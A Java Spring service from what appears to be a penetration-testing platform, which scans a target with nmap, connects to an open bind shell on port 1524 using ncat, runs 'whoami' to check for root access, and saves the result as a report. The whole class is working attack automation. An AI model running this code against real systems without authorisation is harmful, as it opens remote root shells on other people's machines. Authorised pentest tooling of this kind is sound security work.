package org.penforge.backend.pentestScenarios;

import lombok.AllArgsConstructor;
import org.penforge.backend.pentestRecon.PentestReconService;
import org.penforge.backend.pentestReport.PentestReport;
import org.penforge.backend.pentestReport.PentestReportRepository;
import org.penforge.backend.pentestReport.PortData;
import org.springframework.stereotype.Service;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.UUID;

@Service
@AllArgsConstructor
public class BindShellConnectService {

    private final PentestReconService pentestReconService;
    private final PentestReportRepository pentestReportRepository;

    public String isPortOpen(String targetIp, String userId) throws Exception {
        List<PortData> portDataList = pentestReconService.runNmap(targetIp);
        boolean isFtpPortOpen = portDataList.stream().anyMatch(portData -> portData.getPort().equals("1524/tcp") && portData.getPortState().equals("open"));

        if (isFtpPortOpen) {
            return performBindShell(targetIp, userId, portDataList);
        } else {
            throw new IllegalArgumentException("Bind port is not open on target IP");
        }
    }

    public String performBindShell(String targetIp, String userId, List<PortData> portDataList) {
        boolean rootShellAccess = false;

        try {
            Process process = new ProcessBuilder(Arrays.asList("ncat", targetIp, "1524"))
                    .redirectErrorStream(true)
                    .start();
            Thread.sleep(1000);
            try (OutputStreamWriter writer = new OutputStreamWriter(process.getOutputStream());
                 BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {

                writer.write("whoami\n");
                writer.flush();

                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("root")) {
                        rootShellAccess = true;
                        break;
                    }
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

        PentestReport report = PentestReport.builder()
                .userId(userId)
                .id(UUID.randomUUID().toString())
                .targetIP(targetIp)
                .targetService("bindshell")
                .targetPort(1524)
                .scanDate(new Date())
                .ShellAccess(rootShellAccess)
                .portData(portDataList)
                .build();

        pentestReportRepository.save(report);
        return report.getId();
    }
}
